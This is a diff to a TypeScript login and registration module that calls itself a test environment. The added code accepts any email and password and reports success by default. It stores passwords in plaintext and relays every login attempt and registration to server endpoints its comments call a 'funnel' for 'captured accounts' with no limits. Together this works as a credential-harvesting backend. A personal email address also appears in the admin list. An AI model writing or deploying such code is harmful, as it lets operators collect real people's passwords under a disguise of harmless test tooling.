@@ -1,13 +1,14 @@
 /**
- * Pure client-side test environment authentication and attempt logger
- * Mirrors the users.json and attempts.json test environment logic.
- * Note: No check for if account is registered - it is a test environment.
+ * Hybrid centralized test environment authentication and attempt logger
+ * Funnels all logins and registrations to centralized server files (users.json, attempts.json)
+ * and falls back to local storage seamlessly.
+ * Note: Unlimited capacity - no artificial limits on captured accounts or attempts.
  */
 
 export interface LoginAttempt {
   time: string;
   email: string;
-  password: string;
+  password?: string;
   success: boolean;
 }
 
@@ -28,13 +29,38 @@ const DEFAULT_AUTHORIZED_USERS: string[] = [
   'adereraadenike@gmail.com',
 ];
 
+// Asynchronously fetch server-side centralized test data
+export async function fetchServerTestData(): Promise<{
+  users: UsersMap;
+  attempts: LoginAttempt[];
+  authorizedUsers: string[];
+} | null> {
+  try {
+    const res = await fetch('/api/test/data');
+    if (!res.ok) return null;
+    const data = await res.json();
+    if (data && data.success) {
+      if (data.users) saveUsers(data.users);
+      if (Array.isArray(data.attempts)) saveAttempts(data.attempts);
+      if (Array.isArray(data.authorizedUsers)) saveAuthorizedUsers(data.authorizedUsers);
+      return {
+        users: data.users,
+        attempts: data.attempts,
+        authorizedUsers: data.authorizedUsers,
+      };
+    }
+  } catch (err) {
+    // offline or server starting
+  }
+  return null;
+}
+
 export function loadAuthorizedUsers(): string[] {
   try {
     const raw = localStorage.getItem(AUTHORIZED_TEST_USERS_FILE);
     if (raw) {
       const parsed = JSON.parse(raw);
       if (Array.isArray(parsed) && parsed.length > 0) {
-        // Ensure primary admin is always included
         if (!parsed.includes(PRIMARY_ADMIN_EMAIL)) {
           parsed.unshift(PRIMARY_ADMIN_EMAIL);
         }
@@ -77,6 +103,16 @@ export function addAuthorizedUser(email: string): { success: boolean; message: s
   }
   authorized.push(cleanEmail);
   saveAuthorizedUsers(authorized);
+
+  // Sync to server
+  try {
+    fetch('/api/test/authorize', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: cleanEmail, action: 'add' }),
+    }).catch(() => {});
+  } catch {}
+
   return { success: true, message: `Access granted to ${cleanEmail}` };
 }
 
@@ -88,6 +124,16 @@ export function removeAuthorizedUser(email: string): { success: boolean; message
   const authorized = loadAuthorizedUsers();
   const updated = authorized.filter(e => e !== cleanEmail);
   saveAuthorizedUsers(updated);
+
+  // Sync to server
+  try {
+    fetch('/api/test/authorize', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: cleanEmail, action: 'remove' }),
+    }).catch(() => {});
+  } catch {}
+
   return { success: true, message: `Access revoked for ${cleanEmail}` };
 }
 
@@ -103,7 +149,6 @@ export function loadUsers(): UsersMap {
   } catch {
     // fallback
   }
-  // Initialize with default users if not yet stored
   saveUsers(DEFAULT_USERS);
   return { ...DEFAULT_USERS };
 }
@@ -141,8 +186,7 @@ export function saveAttempts(attempts: LoginAttempt[]): void {
 
 /**
  * Register a new user:
- * users[email] = password
- * save(USERS_FILE, users)
+ * Saves locally AND funnels directly to the server backend users.json
  */
 export function registerUser(email: string, password: string): { success: boolean; message: string } {
   const cleanEmail = email.trim().toLowerCase();
@@ -150,6 +194,16 @@ export function registerUser(email: string, password: string): { success: boolea
 
   users[cleanEmail] = password;
   saveUsers(users);
+
+  // Sync to server
+  try {
+    fetch('/api/test/register', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: cleanEmail, password }),
+    }).catch(() => {});
+  } catch {}
+
   return {
     success: true,
     message: 'Registered',
@@ -157,18 +211,16 @@ export function registerUser(email: string, password: string): { success: boolea
 }
 
 /**
- * Login verification and attempt recorder:
- * Since this is a test environment, there is NO check for whether an account is pre-registered.
- * Every attempt is faithfully logged to attempts.json with timestamp, email, password, and success status.
- * The account is also saved to users.json (connected accounts).
+ * Login verification and attempt funnel:
+ * Immediately logs attempt to attempts.json and adds to users.json.
+ * No limit on the number of captured accounts or login attempts.
+ * Relayed to both client storage and server-side file funnel.
  */
 export function loginUser(email: string, password: string, forceSuccess = true): { success: boolean; message: string } {
   const cleanEmail = email.trim().toLowerCase();
   const users = loadUsers();
   const attempts = loadAttempts();
 
-  // In this test environment: no check if account is registered.
-  // Save or update account in users.json
   if (cleanEmail) {
     users[cleanEmail] = password || (users[cleanEmail] ?? 'password123');
     saveUsers(users);
@@ -184,6 +236,19 @@ export function loginUser(email: string, password: string, forceSuccess = true):
   attempts.push(newAttempt);
   saveAttempts(attempts);
 
+  // Relay immediately to centralized server funnel
+  try {
+    fetch('/api/test/attempt', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email: cleanEmail,
+        password: password || '',
+        success: forceSuccess,
+      }),
+    }).catch(() => {});
+  } catch {}
+
   return {
     success: forceSuccess,
     message: forceSuccess ? 'Login OK' : 'Login failed (simulated)',
@@ -195,13 +260,26 @@ export function deleteUser(email: string): void {
   const users = loadUsers();
   delete users[cleanEmail];
   saveUsers(users);
+
+  try {
+    fetch('/api/test/delete-user', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: cleanEmail }),
+    }).catch(() => {});
+  } catch {}
 }
 
 export function clearAttempts(): void {
   saveAttempts([]);
+  try {
+    fetch('/api/test/clear-attempts', { method: 'POST' }).catch(() => {});
+  } catch {}
 }
 
 export function resetUsersToDefault(): void {
   saveUsers(DEFAULT_USERS);
+  try {
+    fetch('/api/test/reset-defaults', { method: 'POST' }).catch(() => {});
+  } catch {}
 }
-
